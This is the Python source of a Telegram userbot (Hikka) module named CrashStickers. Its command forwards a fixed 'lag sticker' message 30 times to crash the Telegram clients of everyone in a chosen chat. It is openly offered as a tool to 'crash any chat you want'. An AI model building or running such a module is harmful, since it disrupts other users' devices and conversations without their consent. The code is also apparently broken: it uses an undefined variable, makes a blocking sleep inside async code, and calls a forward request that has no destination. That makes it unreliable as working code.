"""
Licensed under GNU General Public License v3:
https://github.com/lapismyt/hikka_mods/blob/main/LICENSE
"""

# meta developer: @LapisMods

__version__ = (1, 0, 0)

import logging
from .. import loader, utils
from hikkatl.tl.functions.messages import ForwardMessagesRequest
import time

logger = logging.getLogger(__name__)

@loader.tds
class CrashStickersMod(loader.Module):
    """Can crash any chat you want"""

    strings = {
        "name": "CrashStickers",
        "wait": "<spoiler>Please, wait...</spoiler>"
    }

    strings_ru = {
        "wait": "<spoiler>Пожалуйста, подождите...</spoiler>"
    }

    def __init__(self):
        self.name = self.strings["name"]

    @loader.command(
        ru_doc="- Отправляет 30 лагающих стикеров, которые крашают Telegram"
    )
    async def breakchatcmd(self, message):
        """- Sends 30 lag stickers, that crashes Telegram"""
        await utils.answer(message, strings["wait"])
        time.sleep(5)
        for i in range(30):
            await self._client(ForwardMessagesRequest(from_peer=1962983002, id=[3], drop_author=False))
